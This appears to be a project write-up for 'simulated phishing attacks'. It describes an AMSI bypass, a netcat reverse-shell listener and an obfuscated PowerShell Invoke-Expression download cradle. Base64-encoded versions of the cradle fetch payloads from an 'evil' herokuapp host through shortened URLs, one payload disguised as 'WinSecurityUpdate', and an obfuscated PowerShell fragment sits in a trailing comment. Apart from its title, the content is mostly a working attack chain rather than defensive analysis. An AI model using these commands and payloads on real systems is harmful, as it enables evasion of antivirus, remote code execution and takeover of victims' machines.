# Vulnerability Assessment and Advanced Threat Defence using Simulated Phishing Attacks

<div style="text-align: center;">
<video width="640" height="360" controls>
  <source src="static/rs_attack_demo.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>
</div>

### AMSI Bypass

To check if this works, you could simply run "Invoke-Mimikatz" into your powershell terminal. Even if we have not imported Mimikatz it will detect that as malicious. But if the AMSI is off or you avoid it, it will just say that "it's not recognized as the name of a cmdlet", so you could say that you've bypassed the AMSI.

![AMSI Bypass Successful](static/amsi_bypass.png)

Without completing an AMSI bypass before hand, the download for the reverse shell attack script is flagged by Windows Defender as malicious content.

![Reverse Shell Failure without AMSI Bypass](static/amsi_rs_flagged.png)

[Technical Documentation.pdf (bytecode77.com)](https://docs.bytecode77.com/r77-rootkit/Technical%20Documentation.pdf)

### Reverse Shell Attack

In this attack, the reverse shell connection is established to the client's own machine to the port 443 (although this could just as easily be done on another IP address). The listener is a session handler to control a compromised victim that reports back to the command-and-control server on a specified IP and port. There are two easy methods to create a listener. 

The first is achievable using ncat:

`sudo << nc / ncat >> -nvlp 443`

The second method is outlined [here](uploads/listener.cmd).

[Credit](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell)

### Converting Invoke-Expression commands to download from URL to Base 64

`InVOkE-EXpresSIoN (New-OBjECt NeT.WEbCLienT).DowNlOaDSTrinG('URL')`

```
https://evil-6841-attack-6a1b3ce85541.herokuapp.com/uploads/a1 
>> http://shorturl.at/mDUZ7 
>> SW5WT2tFLUVYcHJlc1NJb04gKE5ldy1PQmpFQ3QgTmVULldFYkNMaWVuVCkuRG93TmxPYURTVHJp
bkcoJ2h0dHA6Ly9zaG9ydHVybC5hdC9tRFVaNycp

https://evil-6841-attack-6a1b3ce85541.herokuapp.com/uploads/r1 
>> http://shorturl.at/xMY89 
>> SW5WT2tFLUVYcHJlc1NJb04gKE5ldy1PQmpFQ3QgTmVULldFYkNMaWVuVCkuRG93TmxPYURTVHJp
bkcoJ2h0dHA6Ly9zaG9ydHVybC5hdC94TVk4OScp

https://evil-6841-attack-6a1b3ce85541.herokuapp.com/uploads/WinSecurityUpdate >> MY89
```

<!-- PoWeRShELl;;-noP -c " >> UG9XZVJTaEVMbDs7LW5vUCAtYyAi -->
